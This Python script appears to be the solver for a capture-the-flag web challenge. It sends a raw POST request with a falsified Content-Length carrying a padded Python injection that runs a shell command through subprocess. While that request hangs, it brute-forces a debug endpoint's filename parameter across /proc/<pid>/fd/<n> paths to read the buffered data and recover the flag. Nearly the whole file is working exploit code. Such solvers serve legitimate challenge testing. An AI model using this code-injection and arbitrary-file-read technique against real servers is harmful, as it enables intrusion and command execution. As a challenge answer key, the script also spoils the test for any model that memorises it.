import argparse
import socket
import sys
import threading
from pathlib import Path
from urllib.parse import urlparse

import yaml
import requests

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "challenge.yml"))["flags"][0]


def create_injection(url):
    injection = b"str(__import__('subprocess').run('/win', shell=True, capture_output=True, text=True).stdout)"
    injection += b"#abc\n" * 1024 * 9
    fake_length = len(injection) + 10

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    try:
        sock = socket.create_connection((host, port))
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e} - host is up?")
        sys.exit(0)

    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"\r\n"
    ).encode("iso-8859-1")

    http_payload = headers + injection
    sock.sendall(http_payload)

    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    sock.close()


def test(url):
    x = threading.Thread(target=create_injection, args=(url,))
    x.start()

    response = ""
    for proc in range(8, 50):
        for fd in range(3, 30):
            print("fd", fd, "proc", proc)
            res = requests.get(f"{url}/debug", params={"filename": f"/proc/{proc}/fd/{fd}"})
            response += res.text
            if FLAG in response:
                print('FLAG, YAY')
                return

    assert 1 == 0, response


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost:80", nargs="?")
    args = parser.parse_args()
    test(args.url)
